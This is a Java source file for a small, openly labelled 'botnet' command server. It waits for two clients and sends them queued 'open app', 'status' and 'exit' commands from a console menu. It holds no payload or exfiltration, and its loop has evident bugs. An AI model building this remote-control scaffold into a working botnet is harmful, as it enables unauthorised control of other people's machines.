import java.net.*;
import java.io.*;
import java.util.ArrayList;
import java.util.List;

public class BotnetMultiServer {
    private CommandQueue centralQueue = new CommandQueue();
    private final String MENU = "\n------\nEnter a Command name \n1)open app\n2)status\n3)exit\n------";
    private List<BotnetServerThread> serverThreads = new ArrayList<>();

    public static void main(String[] args) throws IOException {
        if (args.length != 1) {
            System.err.println("Usage: java BotnetMultiServer.java <PORT NUMBER>");
            System.exit(1);
        }

        int portNumber = Integer.parseInt(args[0]);
        BotnetMultiServer multiServer = new BotnetMultiServer();
        BufferedReader stdIn = new BufferedReader(new InputStreamReader(System.in));
        Command firstCommand = null;

        final int EXPECTEDCLIENTS = 2; // Set the expected number of clients
        int connectedClients = 0;

        try (ServerSocket serverSocket = new ServerSocket(portNumber)) {
            System.out.println("[+]BotnetMultiServer is running");
            while (connectedClients != EXPECTEDCLIENTS) {
                System.out.println("[*]Waiting for clients " + connectedClients + "/" + EXPECTEDCLIENTS + " connected");
                Socket clientSocket = serverSocket.accept();
                BotnetServerThread serverThread = new BotnetServerThread(clientSocket);
                multiServer.serverThreads.add(serverThread);
                System.out.println("[+]Client connected");
                serverThread.start(); // Start the server thread

                connectedClients++;
            }
            System.out.println("[+] All clients connected");

            while (true) {
                System.out.println(multiServer.MENU);
                System.out.print("> ");
                String commandName = stdIn.readLine();
                Command command = multiServer.create_command(commandName, EXPECTEDCLIENTS);
                Command command1 = multiServer.create_command("2", EXPECTEDCLIENTS);
                multiServer.centralQueue.put(command);
                multiServer.centralQueue.put(command1);                

                for(int i=0; i< multiServer.centralQueue.size(); i++){
                    for (BotnetServerThread thread : multiServer.serverThreads) {
                        thread.updateQueue(multiServer.centralQueue);
                        thread.processQueue();
    
                        CommandQueue currentQueue = thread.returnQueue();
                        firstCommand = currentQueue.peek();
    
                        if (currentQueue == null) {
                            multiServer.serverThreads.remove(thread);
                            continue;
                        }
    
                        multiServer.centralQueue = currentQueue;
    
                        // multiServer.centralQueue.status_of_queue();
    
                        System.out.println("[+]Client " + thread.getName() + ": " + firstCommand.getResponse());
    
                        if (!thread.returnStatus()) {
                            multiServer.serverThreads.remove(thread);
                            break;
                        }
                    }
                }
            }
        } catch (IOException e) {
            System.err.println("[-] Could not listen on port: " + portNumber);
            System.exit(-1);
        }
    }

    private Command create_command(String commandName, int timeToLive) {
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(System.in));
        Command command = new Command(commandName);
        command.setMaxLife(timeToLive);
        switch (command.getCommandName()) {
            case "1":
                command.setCommand("openApp");
                try {
                    System.out.print("[>]App Name: ");
                    String appName = bufferedReader.readLine();
                    command.setInstructions(appName);
                } catch (IOException e) {
                    e.printStackTrace();
                }
                break;
            case "2":
                command.setCommand("status");
                command.setInstructions("show the status of the client");
                break;
            case "3":
                command.setCommand("exit");
                break;
            default:
                System.out.println("[-]Invalid Input");
                break;
        }
        return command;
    }
}
